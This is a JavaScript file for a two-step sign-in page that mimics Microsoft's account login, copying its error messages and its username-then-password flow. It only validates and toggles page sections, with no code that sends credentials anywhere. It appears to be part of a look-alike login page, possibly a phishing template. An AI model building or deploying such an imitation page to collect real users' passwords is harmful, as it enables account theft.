document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

    let unameVal = pwdVal = false;
    /////next button
    const nxt = document.getElementById('btn_next');
    const form = document.getElementById('login_form')

    nxt.addEventListener('click', () => {
        // Check if the input passes native HTML validation
        if (!unameInp.checkValidity()) {
            unameInp.reportValidity();  // This will trigger the browser's built-in error display
            return;  // Stop execution if input is invalid
        }
        
        // Validate the form (if you have custom validation logic)
        validate();
    
        // Assuming unameVal is defined somewhere in validate() or earlier in the code
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            });
            view = "pwd";
        }
    });
    
    
    //     // Proceed with the rest of the logic if email is valid
    //     const unameVal = unameInp.value.trim();
    //     document.getElementById("section_uname").classList.toggle('d-none');
    //     document.getElementById('section_pwd').classList.remove('d-none');
    //     document.querySelectorAll('#user_identity').forEach((e) => {
    //         e.innerText = unameVal;
    //     });
    //     view = "pwd";
    // });

    // nxt.addEventListener('click', () => {
    //     //validate the form
    //     validate();
    //     if (unameVal) {
    //         document.getElementById("section_uname").classList.toggle('d-none');
    //         document.getElementById('section_pwd').classList.remove('d-none');
    //         document.querySelectorAll('#user_identity').forEach((e) => {
    //             e.innerText = unameInp.value;
    //         })
    //         view = "pwd";
    //     }
    // })

    //////sign in button

    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', () => {
        //validate the form
        
        //Checking password validity

        if (!pwdInp.checkValidity()) {
            pwdInp.reportValidity()
            return;
        }
    
        validate();
        if (pwdVal) {
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";
        }
    })

    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }

        }
        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }

        }
        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
            unameInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
            pwdInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        }
        return false;
    }

    //back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })

    //final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            //close the window
            window.open(location, '_self').close();
        })
    })
})